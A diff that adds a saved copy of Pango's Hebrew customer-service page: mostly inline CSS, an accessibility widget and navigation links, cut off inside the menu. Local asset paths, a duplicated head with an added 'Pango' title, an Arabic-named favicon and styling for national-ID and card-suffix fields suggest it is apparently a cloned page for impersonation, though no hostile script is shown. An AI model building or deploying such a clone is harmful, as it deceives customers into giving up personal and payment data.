@@ -1,0 +1,1462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pango</title>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>צור קשר ושירות לקוחות | פנגו</title>
+        <style>
+            html {
+                -ms-text-size-adjust: 100%;
+                -webkit-text-size-adjust: 100%
+            }
+
+            body {
+                margin: 0
+            }
+
+            article,footer,header,nav {
+                display: block
+            }
+
+            ul,li {
+                margin: 0;
+                padding: 0
+            }
+
+            li {
+                list-style: none
+            }
+
+            a {
+                background: transparent;
+                color: inherit;
+                text-decoration: none
+            }
+
+            a:active,a:hover {
+                outline: 0
+            }
+
+            strong {
+                font-weight: bold
+            }
+
+            img {
+                border: 0
+            }
+
+            button,input,select,textarea {
+                font-family: Arial,Helvetica,sans-serif;
+                font: inherit;
+                margin: 0
+            }
+
+            button,select {
+                text-transform: none
+            }
+
+            input {
+                line-height: normal
+            }
+
+            textarea {
+                overflow: auto
+            }
+
+            html,body {
+                direction: rtl;
+                text-rendering: optimizeLegibility
+            }
+
+            img {
+                max-width: 100%
+            }
+
+            .flexi_wrapper {
+                max-width: 100%;
+                overflow: hidden
+            }
+
+            .container {
+                width: 92%;
+                margin-left: auto;
+                margin-right: auto;
+                position: relative;
+                -webkit-box-sizing: border-box;
+                -moz-box-sizing: border-box;
+                -ms-box-sizing: border-box;
+                box-sizing: border-box
+            }
+
+            .rtl {
+                direction: rtl
+            }
+
+            .center {
+                text-align: center
+            }
+
+            .margin {
+                margin: 1em
+            }
+
+            @media only screen and (max-width: 767px) {
+                html,body {
+                    font-size:12pt
+                }
+
+                .sp_hide {
+                    display: none!important
+                }
+            }
+
+            @media only screen and (max-width: 479px) {
+                .container {
+                    width:100%
+                }
+            }
+
+            @media only screen and (min-width: 480px) and (max-width:767px) {
+                .container {
+                    width:100%
+                }
+            }
+
+            @media only screen and (min-width: 768px) and (max-width:1199px) {
+            }
+
+            @media only screen and (min-width: 768px) and (max-width:979px) {
+                html,body {
+                    font-size:12pt
+                }
+
+                .container {
+                    width: 100%;
+                    max-width: 931px
+                }
+            }
+
+            @media only screen and (min-width: 980px) and (max-width:1199px) {
+                html,body {
+                    font-size:12pt
+                }
+
+                .container {
+                    width: 95%
+                }
+            }
+
+            @media only screen and (min-width: 1200px) and (max-width:1399px) {
+                html,body {
+                    font-size:12pt
+                }
+            }
+
+            @media only screen and (min-width: 1200px) and (max-width:1599px) {
+                html,body {
+                    font-size:12pt
+                }
+
+                .container {
+                    width: 95%;
+                    min-width: 1140px;
+                    max-width: 1200px
+                }
+            }
+
+            @media only screen and (min-width: 1600px) {
+                html,body {
+                    font-size:12pt
+                }
+
+                .container {
+                    width: 95%;
+                    max-width: 1700px
+                }
+            }
+
+            @font-face {
+                font-family: "Icons";
+                src: url(srcc/s1)format("woff2");
+                font-weight: normal;
+                font-style: normal
+            }
+
+            @-webkit-keyframes fa-spin {
+                0% {
+                    -webkit-transform: rotate(0deg);
+                    transform: rotate(0deg)
+                }
+
+                100% {
+                    -webkit-transform: rotate(359deg);
+                    transform: rotate(359deg)
+                }
+            }
+
+            @keyframes fa-spin {
+                0% {
+                    -webkit-transform: rotate(0deg);
+                    transform: rotate(0deg)
+                }
+
+                100% {
+                    -webkit-transform: rotate(359deg);
+                    transform: rotate(359deg)
+                }
+            }
+
+            @font-face {
+                font-family: "Icons";
+                src: url(srcc/s2)format("woff2");
+                font-weight: normal;
+                font-style: normal
+            }
+
+            .ic {
+                display: inline-block;
+                font: normal normal normal 14px/1 Icons;
+                font-size: inherit;
+                text-rendering: auto;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+                font-family: "Icons"
+            }
+
+            .icon-close:before {
+                content: ""
+            }
+
+            .icon-user:before {
+                content: ""
+            }
+
+            .icon-menu:before {
+                content: ""
+            }
+
+            @font-face {
+                font-family: "serviceIcons";
+                src: url(srcc/s3)format("woff2");
+                font-weight: normal;
+                font-style: normal
+            }
+
+            .si {
+                display: inline-block;
+                font: normal normal normal 14px/1 serviceIcons;
+                font-size: inherit;
+                text-rendering: auto;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+                font-family: "serviceIcons"
+            }
+
+            .icon-Google_Play:before {
+                content: ""
+            }
+
+            .icon-Apple_Store:before {
+                content: ""
+            }
+
+            select,textarea,input[type="text"],input[type="tel"] {
+                padding: 1rem 1.5rem;
+                width: 100%;
+                max-width: 100%;
+                display: block;
+                background: none;
+                color: #000;
+                border: 1px solid #d9d9d9;
+                border-radius: 2em
+            }
+
+            .notie select {
+                appearance: none;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                -ms-appearance: none;
+                -o-appearance: none;
+                background: url(img/p2.png)1rem center no-repeat transparent;
+                padding-left: 40px
+            }
+
+            input[type="checkbox"]+label:not(.error),input.checkbox+label:not(.error) {
+                position: relative;
+                vertical-align: top;
+                display: inline-block;
+                -webkit-box-sizing: border-box;
+                -moz-box-sizing: border-box;
+                box-sizing: border-box
+            }
+
+            input[type="checkbox"]+label:not(.error):before,input.checkbox+label:not(.error):before {
+                content: "";
+                font-size: 1em;
+                display: inline-block;
+                width: 1em;
+                text-align: center;
+                font-family: "FontAwesome";
+                margin-left: 0.5em
+            }
+
+            input[type="checkbox"]:checked+label:not(.error):before,input.checkbox:checked+label:not(.error):before {
+                content: "";
+                right: 0.1em
+            }
+
+            * {
+                -webkit-box-sizing: border-box;
+                -moz-box-sizing: border-box;
+                -ms-box-sizing: border-box;
+                box-sizing: border-box
+            }
+
+            html,body {
+                background: #fff;
+                color: #000;
+                height: 100%;
+                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale
+            }
+
+            .flexi_wrapper {
+                background: #fff;
+                min-height: initial
+            }
+
+            h2,h3 {
+                margin: 0;
+                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
+                line-height: 1em
+            }
+
+            h2,h3 {
+                text-transform: uppercase
+            }
+
+            h2 {
+                margin-bottom: 0.25rem
+            }
+
+            @media only screen and (min-width: 767px) {
+                img {
+                    image-rendering:-webkit-optimize-contrast
+                }
+            }
+
+            @media only screen and (max-width: 767px) {
+            }
+
+            @media only screen and (max-width: 767px) {
+            }
+
+            .icon {
+                width: auto;
+                display: inline-block
+            }
+
+            .x2 {
+                height: 2rem
+            }
+
+            button,.button {
+                padding: 1rem 1.5rem;
+                white-space: nowrap;
+                text-align: center;
+                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
+                background: var(--bgColor,#2e69e7);
+                color: #fff;
+                border: 1px solid var(--bgColor,#2e69e7);
+                cursor: pointer;
+                display: inline-block;
+                border-radius: 2em;
+                position: relative;
+                overflow: hidden;
+                min-width: 10em;
+                transition: 250ms
+            }
+
+            button:hover,button:focus,.button:hover,.button:focus {
+                background: none;
+                color: #2e69e7
+            }
+
+            iframe {
+                border: none!important;
+                background-color: transparent;
+                overflow: hidden;
+                width: 100%
+            }
+
+            *:focus {
+                outline: 0
+            }
+
+            .container--has-focus *:focus,.com_form *:focus {
+                box-shadow: 0 0 3px 2px #2e69e7!important
+            }
+
+            .com_accessibility_accesskey {
+                position: absolute;
+                right: -9000px;
+                height: 1px;
+                width: 1px;
+                overflow: hidden;
+                margin: 0;
+                padding: 0.5em;
+                color: #fff;
+                background: #A4A8AB
+            }
+
+            .com_accessibility_accesskey:active,.com_accessibility_accesskey:focus {
+                z-index: 999999;
+                top: 0;
+                right: 0;
+                height: auto;
+                width: auto;
+                overflow: visible
+            }
+
+            .icon-menu:before {
+                font-size: 1.3rem
+            }
+
+            .header-sticky {
+                height: 5.5rem
+            }
+
+            header.header {
+                position: fixed;
+                top: 0;
+                right: 0;
+                left: 0;
+                z-index: 20;
+                background: #fff
+            }
+
+            header.header .logo {
+                display: block
+            }
+
+            header.header .logo img {
+                display: block;
+                width: auto;
+                height: 5.5rem;
+                padding: 1.5rem 1rem
+            }
+
+            header.header .serach {
+                background: #fff;
+                padding: .5rem
+            }
+
+            header.header .serach input {
+                border: 0;
+                border-radius: 0
+            }
+
+            header.header .m_button {
+                padding: 0 .5rem
+            }
+
+            header.header .m_button span.text {
+                position: relative;
+                display: block;
+                padding: 1rem 3rem 1rem 1.5rem;
+                background: #eef9fb;
+                color: #000;
+                border-radius: 2rem;
+                cursor: pointer
+            }
+
+            header.header .m_button span.text>i {
+                position: absolute;
+                top: 50%;
+                transform: translateY(-50%);
+                right: 1.5rem;
+                color: #2e69e7
+            }
+
+            @media only screen and (max-width: 767px) {
+                header.header .m_button span.text {
+                    padding:1.5rem
+                }
+
+                header.header .m_button span.text>i {
+                    right: 1rem
+                }
+
+                header.header .m_button span.text span {
+                    border: 0;
+                    clip: rect(0,0,0,0);
+                    height: 1px;
+                    margin: -1px;
+                    overflow: hidden;
+                    padding: 0;
+                    position: absolute;
+                    width: 1px
+                }
+            }
+
+            header.header .header-content-wrap {
+                display: flex;
+                align-items: center
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap {
+                padding: 0 .5rem;
+                display: flex;
+                flex-grow: 1
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle+.header-label-nav-toggle::before {
+                content: none
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle+.header-label-nav-toggle+nav {
+                position: fixed;
+                top: 0;
+                right: 0;
+                transform: translateX(100%);
+                transition: 150ms cubic-bezier(0.25,0.46,0.45,0.94);
+                width: 100vw;
+                max-width: 32rem;
+                z-index: 20;
+                padding-left: 5rem
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle+.header-label-nav-toggle+nav+.header-label-nav-toggle-dim {
+                position: fixed;
+                top: 0;
+                bottom: 0;
+                right: 0;
+                z-index: 15;
+                padding-top: 5rem;
+                width: 100%;
+                flex-direction: column;
+                align-items: center;
+                transform: translateX(100%);
+                transition: 10ms ease-in-out;
+                background: rgba(0,0,0,0.3)
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle:checked+.header-label-nav-toggle+nav {
+                transform: translateX(0)
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-input-nav-toggle:checked+.header-label-nav-toggle+nav+.header-label-nav-toggle-dim {
+                transform: translateX(0)
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-label-close-nav-toggle {
+                position: absolute;
+                top: 1rem;
+                left: 1rem;
+                width: 3rem;
+                height: 3rem;
+                border-radius: 50%;
+                background: #fff;
+                cursor: pointer;
+                display: flex;
+                justify-content: center;
+                align-items: center
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-label-close-nav-toggle>span {
+                border: 0;
+                clip: rect(0,0,0,0);
+                height: 1px;
+                margin: -1px;
+                overflow: hidden;
+                padding: 0;
+                position: absolute;
+                width: 1px
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap .header-label-close-nav-toggle>i {
+                color: #2e69e7
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0 {
+                background: #e5ecfc;
+                overflow: auto;
+                height: var(--wh,100vh)
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar {
+                width: 6px
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar-track {
+                background: #89abf2
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar-thumb {
+                background: #2e69e7
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0::-webkit-scrollbar-thumb:hover {
+                background: #1a5ae2
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0>li>a {
+                position: relative;
+                display: block;
+                padding: 1.5rem 2rem;
+                font-size: 1.2rem;
+                background: #e5ecfc;
+                border-top: 2px solid #fff
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0>li:first-child>a {
+                border-top: 0
+            }
+
+            header.header .header-content-wrap .menu-tools-wrap nav ul.lavel-0>li.has_childs>a:after {
+                content: "+";
+                position: absolute;
+                top: 50%;
+                left: 1rem;
+                transform: translateY(-50%) rotate(0deg);
+                transform-origin: center;
+                transition: 200ms cubic-bezier(0.25,0.46,0.45,0.94)
+            }
+
+            @media screen and (min-width: 0\0) and (min-resolution:.001dpcm) {
+            }
+
+            @media screen and (max-width: 800px) and (orientation:landscape),screen and (max-height:300px) {
+            }
+
+            @media all and (max-width: 900px) {
+            }
+
+            article.page {
+                background: #fff;
+                min-height: calc(100vh - 17rem)
+            }
+
+            @media only screen and (max-width: 767px) {
+                article.page {
+                    min-height:calc(100vh - 31rem)
+                }
+            }
+
+            article.page .page-title-wrap {
+                margin: 1rem 0;
+                padding: 0 1rem;
+                text-align: center
+            }
+
+            article.page .com_breadcrumbs {
+                font-size: .8rem;
+                color: #000;
+                margin: 1rem 0
+            }
+
+            article.page .title {
+                margin: 1rem 0;
+                padding: 0 1rem;
+                font-size: 1.6rem;
+                font-weight: bold;
+                color: var(--bgColor,#2e69e7);
+                text-align: center
+            }
+
+            @media only screen and (max-width: 767px) {
+            }
+
+            article.page .page-info-wrap {
+                text-align: center
+            }
+
+            .content {
+                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
+                font-weight: lighter;
+                width: 100%
+            }
+
+            @media only screen and (max-width: 767px) {
+            }
+
+            .content h3 {
+                font-size: 1em;
+                font-weight: bold
+            }
+
+            .content p {
+                line-height: 1.5em
+            }
+
+            .content a {
+                text-decoration: underline
+            }
+
+            .content p {
+                margin-bottom: 1rem;
+                margin-top: 1rem
+            }
+
+            .content p:first-child {
+                margin-top: 0
+            }
+
+            .content p:last-child {
+                margin: 0
+            }
+
+            @media only screen and (max-width: 767px) {
+            }
+
+            .com_breadcrumbs {
+                text-decoration: none
+            }
+
+            .mod_form_contact .page-form-service-type {
+                display: flex;
+                justify-content: center;
+                padding: .5rem
+            }
+
+            .mod_form_contact .page-form-service-type>li {
+                padding: .5rem
+            }
+
+            .mod_form_contact .page-form-service-type>li a {
+                position: relative;
+                color: var(--bgColor,#2e69e7);
+                display: block
+            }
+
+            .mod_form_contact .page-form-service-type>li a:not(.active) {
+                color: #000
+            }
+
+            .mod_form_contact .page-form-service-type>li a:after {
+                content: "";
+                position: absolute;
+                bottom: -3px;
+                right: 0;
+                left: 0;
+                border-bottom: 3px solid
+            }
+
+            .mod_form_contact .page-form-fields-wrap {
+                display: flex;
+                flex-flow: row wrap;
+                padding: .5rem;
+                padding-bottom: 2rem;
+                max-width: 50rem;
+                margin: auto
+            }
+
+            .mod_form_contact .field {
+                position: relative;
+                padding: .5rem;
+                width: 100%;
+                flex-grow: 1
+            }
+
+            .mod_form_contact .field.field-tel,.mod_form_contact .field.field-mail,.mod_form_contact .field.field-nid,.mod_form_contact .field.field-cardsuffix {
+                width: 50%
+            }
+
+            .mod_form_contact textarea {
+                resize: none;
+                height: 12rem
+            }
+
+            .mod_form_contact .page-form-btn-submit {
+                width: 100%;
+                padding: 0.5rem;
+                text-align: center
+            }
+
+            footer.footer {
+                background: #fafafa
+            }
+
+            footer.footer .footer-nav {
+                display: flex;
+                flex-flow: row wrap;
+                align-items: center
+            }
+
+            footer.footer .footer-nav>div {
+                width: calc(50% - 13rem)
+            }
+
+            footer.footer .footer-nav>div ul {
+                display: flex;
+                flex-flow: row wrap
+            }
+
+            footer.footer .footer-nav>div ul li a {
+                display: block;
+                padding: 1rem
+            }
+
+            footer.footer .footer-nav>.footer-nav-right ul {
+                justify-content: flex-start
+            }
+
+            footer.footer .footer-nav>.footer-nav-center {
+                width: 26rem;
+                padding: .5rem;
+                text-align: center
+            }
+
+            footer.footer .footer-nav>.footer-nav-center .footer-nav-center-title {
+                padding: .5rem
+            }
+
+            footer.footer .footer-nav>.footer-nav-center ul {
+                justify-content: center
+            }
+
+            footer.footer .footer-nav>.footer-nav-center ul li {
+                padding: .5rem;
+                direction: ltr
+            }
+
+            footer.footer .footer-nav>.footer-nav-center ul li:nth-child(odd) a {
+                padding: 1rem 1.5rem;
+                white-space: nowrap;
+                text-align: center;
+                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
+                background: var(--bgColor,#2e69e7);
+                color: #fff;
+                border: 1px solid var(--bgColor,#2e69e7);
+                cursor: pointer;
+                display: inline-block;
+                border-radius: 2em;
+                position: relative;
+                overflow: hidden;
+                min-width: 10em;
+                transition: 250ms
+            }
+
+            footer.footer .footer-nav>.footer-nav-center ul li:nth-child(odd) a:hover,footer.footer .footer-nav>.footer-nav-center ul li:nth-child(odd) a:focus {
+                background: none;
+                color: #2e69e7
+            }
+
+            footer.footer .footer-nav>.footer-nav-center ul li:nth-child(even) a {
+                padding: 1rem 1.5rem;
+                white-space: nowrap;
+                text-align: center;
+                font-family: "SimplerPro","Arial",Helvetica,sans-serif;
+                background: var(--bgColor,#2e69e7);
+                color: #fff;
+                border: 1px solid var(--bgColor,#2e69e7);
+                cursor: pointer;
+                display: inline-block;
+                border-radius: 2em;
+                position: relative;
+                overflow: hidden;
+                min-width: 10em;
+                transition: 250ms;
+                background: none;
+                color: var(--bgColor,#2e69e7)
+            }
+
+            footer.footer .footer-nav>.footer-nav-center ul li:nth-child(even) a:hover,footer.footer .footer-nav>.footer-nav-center ul li:nth-child(even) a:focus {
+                background: none;
+                color: #2e69e7
+            }
+
+            footer.footer .footer-nav>.footer-nav-center ul li:nth-child(even) a:hover,footer.footer .footer-nav>.footer-nav-center ul li:nth-child(even) a:focus {
+                background: var(--bgColor,#2e69e7);
+                color: #fff
+            }
+
+            footer.footer .footer-nav>.footer-nav-left ul {
+                justify-content: flex-end
+            }
+
+            @media only screen and (max-width: 768px) {
+                footer.footer .footer-nav>div {
+                    width:100%
+                }
+
+                footer.footer .footer-nav>.footer-nav-right ul {
+                    justify-content: center
+                }
+
+                footer.footer .footer-nav>.footer-nav-right ul li {
+                    width: 100%;
+                    text-align: center;
+                    border-top: 2px solid #fff
+                }
+
+                footer.footer .footer-nav>.footer-nav-center {
+                    order: -1;
+                    width: 100%
+                }
+
+                footer.footer .footer-nav>.footer-nav-center ul {
+                    justify-content: center
+                }
+
+                footer.footer .footer-nav>.footer-nav-left ul {
+                    justify-content: center
+                }
+
+                footer.footer .footer-nav>.footer-nav-left ul li {
+                    width: 100%;
+                    text-align: center;
+                    border-top: 2px solid #fff
+                }
+            }
+
+            .modal {
+                opacity: 0;
+                visibility: hidden;
+                position: fixed;
+                box-sizing: border-box;
+                z-index: 9999;
+                padding: 1rem;
+                top: 0;
+                left: 0;
+                outline: none;
+                margin: 0 auto;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0,0,0,0.4);
+                transition: 250ms
+            }
+
+            .modal .modal_container {
+                position: absolute;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                padding: 1rem;
+                text-align: right;
+                overflow: auto;
+                box-sizing: border-box;
+                -ms-overflow-style: none;
+                scrollbar-width: none
+            }
+
+            .modal .modal_container::-webkit-scrollbar {
+                display: none
+            }
+
+            .modal .modal_container:before {
+                content: "";
+                display: inline-block;
+                height: 100%;
+                vertical-align: bottom
+            }
+
+            .modal .modal_content {
+                position: relative;
+                background-color: #fff;
+                border-radius: 1rem;
+                display: inline-block;
+                vertical-align: middle;
+                padding: 0;
+                width: 30rem;
+                max-width: 100%;
+                text-align: right;
+                overflow: hidden;
+                top: 0;
+                right: 0
+            }
+
+            .modal .modal_content .content {
+                padding: .5rem;
+                color: #2e69e7;
+                font-size: .8rem
+            }
+
+            .modal .modal_content .content .title {
+                color: #2e69e7
+            }
+
+            .modal .close {
+                line-height: 1;
+                z-index: 1
+            }
+
+            .modal .close:hover,.modal .close:focus {
+                text-decoration: none;
+                cursor: pointer
+            }
+        </style>
+        <meta name="description" content="אפליקציית חניה מתקדמת שמונעת דוחות וחוסכת זמן וכסף. חניה מהנייד בכחול לבן, שירות טסט וטיפול עד הבית, יציאה מהירה מחניונים ועוד מגוון פתרונות לנהג ולרכב.">
+        <meta name="keywords" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="apple-mobile-web-app-title" content="Pango">
+        <meta name="theme-color" content="#ffffff">
+        <link rel="canonical" href="https://www.pango.co.il/customer-service">
+        <style>
+            @-webkit-keyframes spinner-rotator {
+                0% {
+                    -webkit-transform: rotate(0deg);
+                    transform: rotate(0deg)
+                }
+
+                100% {
+                    -webkit-transform: rotate(270deg);
+                    transform: rotate(270deg)
+                }
+            }
+
+            @keyframes spinner-rotator {
+                0% {
+                    -webkit-transform: rotate(0deg);
+                    transform: rotate(0deg)
+                }
+
+                100% {
+                    -webkit-transform: rotate(270deg);
+                    transform: rotate(270deg)
+                }
+            }
+
+            @-webkit-keyframes spinner-dash {
+                0% {
+                    stroke-dashoffset: 187
+                }
+
+                50% {
+                    stroke-dashoffset: 46.75;
+                    -webkit-transform: rotate(135deg);
+                    transform: rotate(135deg)
+                }
+
+                100% {
+                    stroke-dashoffset: 187;
+                    -webkit-transform: rotate(450deg);
+                    transform: rotate(450deg)
+                }
+            }
+
+            @keyframes spinner-dash {
+                0% {
+                    stroke-dashoffset: 187
+                }
+
+                50% {
+                    stroke-dashoffset: 46.75;
+                    -webkit-transform: rotate(135deg);
+                    transform: rotate(135deg)
+                }
+
+                100% {
+                    stroke-dashoffset: 187;
+                    -webkit-transform: rotate(450deg);
+                    transform: rotate(450deg)
+                }
+            }
+        </style>
+        <style>
+            :host {
+                all: initial
+            }
+
+            #INDWrap {
+                position: absolute;
+                width: 100%;
+                height: 0;
+                top: 0;
+                z-index: 2147483647
+            }
+
+            #INDblindNotif {
+                position: fixed!important
+            }
+
+            @keyframes INDloader {
+                0% {
+                    transform: rotate(0)
+                }
+
+                100% {
+                    transform: rotate(360deg)
+                }
+            }
+
+            #INDquickAccess,#INDquickAccess li,#INDquickAccess ul {
+                height: 0;
+                list-style: none
+            }
+
+            #INDquickAccess ul {
+                margin: 0;
+                padding: 0;
+                list-style: none
+            }
+
+            #INDquickAccess li {
+                margin: 0;
+                padding: 0
+            }
+
+            #INDquickAccess li:after,#INDquickAccess li:before {
+                content: ""!important;
+                display: none!important
+            }
+
+            #INDquickAccess button {
+                position: fixed;
+                top: -300px;
+                margin: 0;
+                padding: 8px 16px;
+                height: auto;
+                width: auto;
+                font-size: 24px;
+                font-weight: 700;
+                text-align: center;
+                line-height: normal!important;
+                cursor: pointer;
+                color: #fff;
+                background: #000;
+                border-radius: 4px;
+                border: 1px solid #fff;
+                transition: top .6s;
+                z-index: 10
+            }
+
+            .INDlangdirRTL #INDquickAccess button {
+                font-family: Spacer,Arial,sans-serif
+            }
+
+            .INDpositionRight #INDquickAccess button {
+                right: 180px
+            }
+
+            #INDquickAccess button:focus {
+                top: 0
+            }
+
+            :not(#INDdummy) :not(#INDdummy).INDhiddenText {
+                display: inline-block;
+                color: #000;
+                background: #fff;
+                position: absolute;
+                height: 1px;
+                width: 1px;
+                overflow: hidden;
+                clip: rect(1px,1px,1px,1px)
+            }
+
+            #INDmenu {
+                position: fixed;
+                top: 0;
+                margin: 0;
+                padding: 0;
+                width: 180px;
+                height: 180px;
+                z-index: 100000;
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                -o-user-select: none;
+                user-select: none;
+                border: none;
+                border-top: 27px solid #0a7da4;
+                border-bottom: 13px solid #0a7da4;
+                background: #fff;
+                transition: left .4s ease-in,right .4s ease-in,top .4s ease-in,visibility .4s ease-in!important
+            }
+
+            .INDpositionRight #INDmenu {
+                left: initial!important;
+                border-left: 4px solid #0a7da4
+            }
+
+            #INDmenu[aria-hidden=true] {
+                visibility: hidden
+            }
+
+            .INDpositionRight #INDmenu[aria-hidden=true] {
+                right: -400px
+            }
+
+            @media screen and (max-width: 800px) {
+            }
+
+            #INDbtnWrap {
+                margin: 0;
+                padding: 0;
+                border: none;
+                z-index: 9999
+            }
+
+            @keyframes border-train {
+                0% {
+                    clip-path: polygon(0 0,0 100%,0 100%,0 0)
+                }
+
+                25% {
+                    clip-path: polygon(0 0,0 100%,25% 100%,25%0)
+                }
+
+                50% {
+                    clip-path: polygon(0 0,0 100%,50% 100%,50%0)
+                }
+
+                75% {
+                    clip-path: polygon(0 0,0 100%,75% 100%,75%0)
+                }
+
+                100% {
+                    clip-path: polygon(0 0,0 100%,100% 100%,100%0)
+                }
+            }
+
+            #INDpopup {
+                position: fixed;
+                top: 0;
+                right: 0;
+                bottom: 0;
+                left: 0;
+                background: rgba(0,0,0,.7);
+                z-index: 99999999999;
+                pointer-events: auto;
+                opacity: 1;
+                transition: opacity 250ms ease-in
+            }
+
+            .INDlangdirRTL #INDpopup {
+                direction: rtl
+            }
+
+            #INDpopup:not(.open) {
+                opacity: 0;
+                visibility: hidden;
+                pointer-events: none;
+                transition: opacity 250ms ease-in,visibility 0s ease 250ms
+            }
+
+            @media screen and (max-width: 800px) {
+            }
+        </style>
+        <meta name="referrer" content="no-referrer">
+        <link rel="shortcut icon" href="img/تنزيل.ico">
+        <style>
+            .sf-hidden {
+                display: none!important
+            }
+        </style>
+    </head>
+    <body class="device_computer os_windows INDlangdirRTL INDpositionRight INDDesktop INDChrome INDhasDragTooltip" data-siteurl="https://www.pango.co.il" data-site="1" style="--wh:945px">
+        <div id="INDWrap" lang="he" dir="rtl" data-ind-version="4.1.2" style="display:block">
+            <div id="INDblindNotif" tabindex="-1" class="INDhiddenText" role="alert">שִׂים לֵב: בְּאֲתָר זֶה מֻפְעֶלֶת מַעֲרֶכֶת נָגִישׁ בִּקְלִיק הַמְּסַיַּעַת לִנְגִישׁוּת הָאֲתָר. לְחַץ Control-F11 לְהַתְאָמַת הָאֲתָר לְעִוְורִים הַמִּשְׁתַּמְּשִׁים בְּתוֹכְנַת קוֹרֵא־מָסָךְ; לְחַץ Control-F10 לִפְתִיחַת תַּפְרִיט נְגִישׁוּת.</div>
+            <div id="INDbtnWrap"></div>
+            <div id="INDmenu" aria-hidden="true"></div>
+            <div id="INDpopup" aria-hidden="true" style="display:none"></div>
+            <div id="INDdata" style="display:none"></div>
+            <div id="INDquickAccess">
+                <ul>
+                    <li>
+                        <button accesskey="b" class="INDshortcutBtn" tabindex="1">
+                            לְחַץ אֶנְטֵר לְהַתְאָמַת הָאֲתָר לְעִוְורִים<span class="INDhiddenText">הַמִּשְׁתַּמְּשִׁים בְּתוֹכְנַת קוֹרֵא־מָסָךְ.</span>
+                        </button>
+                    </li>
+                    <li>
+                        <button accesskey="l" tabindex="1">לְחַץ אֶנְטֵר לְנִוּוּט מִקְלֶדֶת</button>
+                    </li>
+                    <li>
+                        <button tabindex="1">לְחַץ אֶנְטֵר לִפְּתִיחַת תַּפְרִיט נְגִישׁוּת.</button>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="flexi_wrapper" id="flexi_wrapper">
+            <a class="com_accessibility_accesskey" id="skip-link" accesskey="1">מעבר לתוכן העמוד - מקש קיצור 1</a>
+            <a class="com_accessibility_accesskey" accesskey="2">מעבר לתפריט ראשי - מקש קיצור 2</a>
+            <a class="com_accessibility_accesskey" accesskey="3">מעבר לתפריט תחתון - מקש קיצור 3</a>
+            <a class="com_accessibility_accesskey" href="https://www.pango.co.il/sitemap" accesskey="4">מפת אתר - מקש קיצור 4</a>
+            <a class="com_accessibility_accesskey"  accesskey="5">צור קשר - מקש קיצור 5</a>
+            <a class="com_accessibility_accesskey animation_checker" id="stopAnim" href="javascript:void(0)" accesskey="6">עצירת/הפעלת אנימציות - מקש קיצור 6</a>
+            <a class="com_accessibility_accesskey" id="contrast" accesskey="7">ניגודיות - מקש קיצור 7</a>
+            <div class="header-sticky">
+                <header class="header" role="contentinfo" id="header">
+                    <div class="container">
+                        <div class="header-content-wrap">
+                            <div class="menu-tools-wrap">
+                                <div class="m_button">
+                                    <input role="button" type="checkbox" class="header-input-nav-toggle sf-hidden" id="header-nav-toggle" value="on">
+                                    <label for="header-nav-toggle" class="header-label-nav-toggle" aria-label="תפריט"></label>
+                                    <nav role="navigation">
+                                        <label for="header-nav-toggle" class="header-label-close-nav-toggle" aria-label="סגירת תפריט">
+                                            <i class="ic icon-close"></i>
+                                            <span>תפריט</span>
+                                        </label>
+                                        <ul class="lavel-0">
+                                            <li class="serach">
+                                                <form method="GET" action="https://www.pango.co.il/?action=search">
+                                                    <input type="text" name="q" placeholder="מה תרצה לחפש?" value="">
+                                                </form>
+                                            </li>
+                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/services" title="שירותי תחבורה חכמה">
+                                                    <span>שירותי תחבורה חכמה</span>
+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/benefits" title="הטבות בפנגו">
+                                                    <span>הטבות בפנגו</span>
+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/plan-lobby" title="מסלולים">
+                                                    <span>מסלולים</span>
+                                                </a>
+                                                <div class="lavel-1-wrap sf-hidden"></div>
+                                            </li>
+                                            <li class="list-0 has_childs" aria-expanded="false" role="expand button">
+                                                <a href="https://www.pango.co.il/pango-care" title="פנגו Care">
+                                                    <span>פנגו Care</span>
